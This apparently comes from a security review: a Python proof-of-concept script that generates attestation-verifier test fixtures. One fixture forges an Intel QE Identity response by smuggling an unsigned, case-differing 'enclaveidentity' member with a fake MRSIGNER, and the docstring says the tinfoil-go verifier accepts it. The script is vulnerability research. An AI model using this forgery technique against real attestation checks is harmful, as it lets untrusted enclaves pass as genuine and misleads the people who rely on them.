"""PoC 3 fixture generator.

Builds two verify-attestation-v3 fixtures with tinfoil-conformance's own
synthetic generators (synthetic Intel root + PCK chain, synthetic Sigstore root):

  fakeqe-control:  the TD quote is produced by a "QE" whose MRSIGNER (EE..EE)
                   is NOT the signer endorsed by the (signed) QE Identity
                   (DC..DC). Everything else is consistent. Must be rejected.
  fakeqe-casefold: identical document, except the captured QE Identity PCS
                   response carries an extra UNSIGNED member
                   "enclaveidentity": {"mrsigner": "EE..EE"} after the signed
                   "enclaveIdentity". The Intel signature still covers only the
                   signed member. tinfoil-go accepts it.
"""
import copy
import json
import os
import sys

CONF = "/root/tinfoil-review/work/go-verifier-quotes/tinfoil-conformance/fixturegen"
sys.path.insert(0, CONF)
sys.path.insert(0, os.path.join(CONF, "v3"))

import gen_envelope as env  # noqa: E402
import gen_provenance as prov  # noqa: E402
import gen_policy as pol  # noqa: E402
import gen_tdx as gt  # noqa: E402
import gen_golden_tdx as gg  # noqa: E402
import sigstore_synth as sig  # noqa: E402

FAKE_QE_MRSIGNER = b"\xEE" * 32


def build(fake_qe: bool, casefold: bool):
    artifact = gg.tdx_artifact()
    doc = env.base_doc()
    ladder = bytes.fromhex(doc["challenge"]["report_data"])
    body = gt.tsx.TdBodyFields(tee_tcb_svn=b"\x00\x03\x05\x00" + b"\x00" * 12, report_data=ladder)
    chain, quote, responses = gt.build_tdx(body=body, qe_mrsigner=FAKE_QE_MRSIGNER if fake_qe else None)

    if casefold:
        for r in responses:
            if r["url"] == gt.QE_URL:
                raw = env.b64dec(r["body_base64"]) if hasattr(env, "b64dec") else __import__("base64").b64decode(r["body_base64"])
                top = json.loads(raw)
                signed_member = raw[raw.index(b'"enclaveIdentity":') + len(b'"enclaveIdentity":'):raw.index(b',"signature":')]
                forged = b'{"enclaveIdentity":' + signed_member + \
                    b',"enclaveidentity":' + json.dumps({"mrsigner": FAKE_QE_MRSIGNER.hex().upper()}).encode() + \
                    b',"signature":' + json.dumps(top["signature"]).encode() + b'}'
                r["body_base64"] = env.b64(forged)

    code_pred = {"snp_measurement": "ab" * 48,
                 "tdx_measurement": {"rtmr1": gg.RTMR1, "rtmr2": gg.RTMR2},
                 "vm_shape": dict(gg.SHAPE)}
    code_bundle, sig_troot = prov.code_bundle(stmt=prov.statement(predicate=code_pred))
    plat_bundle, _ = pol._bundle(artifact)
    doc["cpu_evidence"]["format"] = gt.TDX_FMT
    doc["cpu_evidence"]["report_base64"] = env.b64(quote)
    doc["collateral"] = [
        prov.code_entry(code_bundle),
        prov.code_freshness_entry(),
        pol.platform_entry(plat_bundle),
        pol.platform_freshness_entry(),
        {"id": "pcs", "role": "endorsement", "format": gt.PCS_FMT,
         "subjects": ["cpu"], "data": {"responses": responses}},
    ]
    return {
        "schema_version": "1", "document_b64": env.b64(env.canon(doc)),
        "nonce_hex": env.NONCE.hex(), "repo": prov.REPO,
        "intel_sgx_root_pem": chain.root_ca.pem,
        "sigstore_trusted_root_json_b64": env.b64(json.dumps(sig_troot).encode()),
        "verification_time_unix": sig.INTEGRATED_TIME,
    }


for name, fake, cf in [("fakeqe-control", True, False), ("fakeqe-casefold", True, True), ("genuineqe-baseline", False, False)]:
    with open(name + ".json", "w") as fh:
        json.dump({"id": name, "stage": "verify-attestation-v3", "input": build(fake, cf)}, fh, indent=1)
    print("wrote", name + ".json")
